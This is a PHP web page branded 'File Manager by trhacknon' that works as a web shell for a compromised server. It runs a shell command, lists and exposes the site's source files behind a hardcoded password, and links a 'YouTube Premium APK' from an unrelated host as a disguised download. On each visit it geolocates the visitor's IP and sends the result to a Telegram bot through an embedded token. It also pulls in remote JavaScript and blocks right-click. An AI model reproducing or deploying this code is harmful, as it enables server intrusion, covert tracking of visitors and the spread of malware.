<!DOCTYPE html>
<html>
<head>
    <title>File Manager by trhacknon</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
    <style>
        body {
            background-color: #333; /* Choisissez la couleur d'arrière-plan de votre choix */
            color: white;
            font-family: 'Courier New', monospace;
        }

        h1 {
            color: red; /* Couleur du titre */
            text-align: center;
        }

        ul {
            list-style-type: none;
            margin: 0;
            padding: 0;
        }

        li {
            margin: 5px 0;
            border: 1px solid red;
            border-radius: 5px;
            transition: background-color 0.3s, transform 0.3s;
            background-color: #00FF00; /* Couleur vive au survol */
        }

        li:hover {
            background-color: #00FF00;
            transform: scale(1.05);
        }

        a {
            text-decoration: none;
            color: green; /* Couleur du lien */
        }

        .directory {
            padding-left: 20px;
            background-color: #333;
            cursor: pointer;
        }

        .hidden {
            display: none;
        }

#fileContent {
    background-color: #222; /* Couleur du cadre de contenu */
    border: 1px solid #00FF00; /* Bordure du cadre de contenu */
    padding: 10px;
    display: none; /* Masqué par défaut */
}

#fileContentText {
    white-space: pre-wrap; /* Préserve les sauts de ligne */
}

        .downloadButton {
            display: block;
            margin: 20px auto;
            padding: 15px 30px;
            background-color: #FF00FF; /* Couleur vive pour le bouton */
            color: #333; /* Couleur du texte */
            text-decoration: none;
            border-radius: 50px; /* Forme spéciale (cercle) */
            text-align: center;
            font-weight: bold;
        }

        .rainbowButton {
            background-image: linear-gradient(to right, violet, indigo, blue, green, yellow, orange, red); /* Couleurs arc-en-ciel */
            color: #fff; /* Couleur du texte en blanc pour contraste */
            background-size: 150% auto;
            background-position: 0 100%;
            transition: background-position 0.5s;
        }

        .rainbowButton:hover {
            background-position: 100% 0;
        }



        #logo {
            max-width: 100px; /* Taille maximale du logo */
            display: block;
            margin: 0 auto;
            transform: rotate(20deg); /* Rotation du logo */
        }
        #funFooter {
            background-color: #222; /* Fond gris pour le pied de page */
            padding: 20px;
            text-align: center;
            color: #FF00FF; /* Couleur vive pour le texte */
        }

        .funText {
            font-weight: bold;
            color: #FFFF00; /* Couleur vive pour le texte en surbrillance */
        }
        #content-container {
        position: relative;
        margin-bottom: 100px; /* Ajustez la hauteur en fonction de la hauteur de votre footer */
        }
        .custom-alert {
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background-color: #ff9900; /* Couleur de fond */
        color: #fff; /* Couleur du texte */
        padding: 20px;
        border-radius: 10px;
        text-align: center;
        z-index: 9999; /* Assurez-vous qu'il est au-dessus de tout le contenu */
        animation: blink 0.5s infinite alternate; /* Animation de clignotement */
        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5); /* Ombre légère */
        }
        .alert-image {
        max-width: 100%; /* Ajustez la largeur si nécessaire */
        height: auto;
        }
        @keyframes blink {
        0% {
        opacity: 1;
        }
        100% {
        opacity: 0;
        }
        }
        #footer {
        position: absolute;
        bottom: 0;
        width: 100%; /* Assurez-vous qu'il occupe toute la largeur */
        background-color: #333; /* Couleur de fond */
        color: #ff9900;
        padding: 20px; /* Ajoutez un espacement au contenu du footer */
        }

    </style>
    <script>
        function toggleDirectory(directory) {
            const ul = directory.nextElementSibling;
            ul.classList.toggle("hidden");
        }

        function loadFileContent(url) {
            const fileContentElement = document.getElementById("fileContentText");
            fileContentElement.innerHTML = "Loading...";

            // Faites une requête AJAX pour charger le contenu du fichier
            const xhr = new XMLHttpRequest();
            xhr.open("GET", url, true);

            xhr.onload = function () {
                if (xhr.status === 200) {
                    fileContentElement.textContent = xhr.responseText;
                    document.getElementById("fileContent").style.display = "block"; // Afficher le cadre de contenu
                } else {
                    fileContentElement.textContent = "Error loading file.";
                }
            };

            xhr.send();
        }
    </script>
</head>
<body>
    <img id="logo" src="http://static-trkn.replit.app/cup.png" alt="Mon Logo Crazy">
    <h1 class="animate__animated animate__bounce">File Manager by trhacknon</h1>
    <p><b>Hostname:</b> <?php echo gethostname(); ?></p>
    <p><b>Uname -a:</b> <?php echo shell_exec('uname -a'); ?></p>

    <ul>
<?php
function isPasswordCorrect() {
    return isset($_POST['password']) && $_POST['password'] === 'trkntrkntrkn';
}

function listFilesAndDirectoriesByExtension($path, $extensions = []) {
    $items = scandir($path);
    if ($items === false) {
        return;
    }

    foreach ($items as $item) {
        if ($item != "." && $item != "..") {
            $itemPath = $path . '/' . $item;

            if (is_dir($itemPath)) {
                echo '<li class="directory animate__animated animate__fadeIn" onclick="toggleDirectory(this)"><b>Directory:</b> ' . $item . '</li>';
                echo '<ul class="hidden">';
                if (isPasswordCorrect()) {
                    listFilesAndDirectoriesByExtension($itemPath, $extensions);
                }
                echo '</ul>';
            } else {
                $fileExtension = pathinfo($itemPath, PATHINFO_EXTENSION);
                if (in_array($fileExtension, $extensions)) {
                    echo '<li class="animate__animated animate__fadeIn"><a href="#" onclick="loadFileContent(\'' . $itemPath . '\')">' . $item . '</a></li>';
                }
            }
        }
    }
}

$webPath = "./"; // Chemin web de votre choix
$allowedExtensions = ["php", "html", "aspx"]; // Extensions autorisées

listFilesAndDirectoriesByExtension($webPath, $allowedExtensions);
?>
    </ul>

<div id="fileContent">
    <pre id="fileContentText"></pre>
</div>

<?php if (!isPasswordCorrect()): ?>
     <center>  <p>Un mot de passe est nécessaire pour accéder aux sous-dossiers.</p>
        <form method="POST">
            Password: <input type="password" name="password">
            <input type="submit" value="Submit">
        </form></center>
<?php endif; ?>

    <a href="https://harrypotter-lordfilm.ru/wp-content/uploads/wpr-addons/forms/YOUTUBE-PREM.apk" target="_blank" class="downloadButton animate__animated animate__bounce rainbowButton">Download YouTube Premium APK</a>
<?php
    $ip = $_SERVER['REMOTE_ADDR'];
    $localTime = date('Y-m-d H:i:s');
    $host = $_SERVER['HTTP_HOST']; // Obtenez le domaine réel de la requête
    // Utilisez l'API ip-api.com pour obtenir des informations sur l'IP
    $ipApiUrl = "http://ip-api.com/json/$ip";
    $ipApiData = file_get_contents($ipApiUrl);
    $ipInfo = json_decode($ipApiData);
    $domain = isset($ipInfo->reverse) ? $ipInfo->reverse : "N/A";
    // Utilisez l'API ipinfo.io pour obtenir des informations de localisation
    $ipInfoUrl = "http://ipinfo.io/$ip/json";
    $ipInfoData = file_get_contents($ipInfoUrl);
    $locationData = json_decode($ipInfoData);
    $city = isset($locationData->city) ? $locationData->city : "N/A";
    $region = isset($locationData->region) ? $locationData->region : "N/A";
    $country = isset($locationData->country) ? $locationData->country : "N/A";
    $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
    $telegramMessage = "Domaine: $domain\nIP: $ip\nHeure: $localTime\n";
    $telegramMessage .= "Hôte: $hostname\n";
    $telegramMessage .= "Domaine Réel: $host\n";
    $telegramMessage .= "Ville: $city\nRégion: $region\nPays: $country";
    $token = "6292566248:AAEqDZCW3DBgxugrnKvIzbDGzyK-TewclQ0";
    $chatId = "-1001966416783";
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatId . "&text=" . urlencode($telegramMessage);
    file_get_contents($url);
    ?>
      <script src="https://hastebytrhacknon.tfhacknonrainbow.repl.co/raw/rodigotagezi.js"></script>
    <script type='text/javascript'>
    // Anti Clic Droit Personnalisé
    var message = "Clic droit interdit par trhacknon. Désolé !"; // Message personnalisé
    function clickIE4() {
    if (2 == event.button) {
    showAlert(message);
    return false;
    }
    }
    function clickNS4(e) {
    if ((document.layers || document.getElementById && !document.all) && (2 == e.which || 3 == e.which)) {
    showAlert(message);
    return false;
    }
    }
    document.layers ? (document.captureEvents(Event.MOUSEDOWN), document.onmousedown = clickNS4) : document.all && !document.getElementById && (document.onmousedown = clickIE4);
    document.oncontextmenu = new Function("showAlert(message); return false;");
    function showAlert(message) {
    var alertBox = document.createElement("div");
    alertBox.className = "custom-alert";
    alertBox.innerHTML = message;
    var alertImage = document.createElement("img");
    alertImage.src = "http://static-trkn.replit.app/cup.png";
    alertImage.className = "alert-image";
    alertBox.appendChild(alertImage);
    // Ajouter l'audio
    var audio = document.createElement("audio");
    audio.src = "https://d.top4top.io/m_2824akq1l0.mp3"; // Chemin du fichier audio
    audio.autoplay = true; // Lecture automatique de l'audio
    alertBox.appendChild(audio);
    document.body.appendChild(alertBox);
    setTimeout(function () {
    document.body.removeChild(alertBox);
    }, 4000); // Disparaît après 4 secondes (ajustez la durée selon vos préférences)
    }
    </script>    <footer id="funFooter">
            <p>Developed by <span class="funText">TRHACKNON</span> for educative use only.</p>
            <p>&copy; <?php echo date("Y"); ?> All rights reserved.</p>
    <center><a href="https://www.wieistmeineip.de/cometo/?en"><img src="https://www.wieistmeineip.de/ip-address/?size=468x60" border="3" width="470" height="60" alt="IP"></a></center><br><iframe width="0%" height="0" scrolling="no" frameborder="no" loop="true" allow="autoplay" src="https://h.top4top.io/m_1642adr790.mp3"> </footer>

</body>
</html>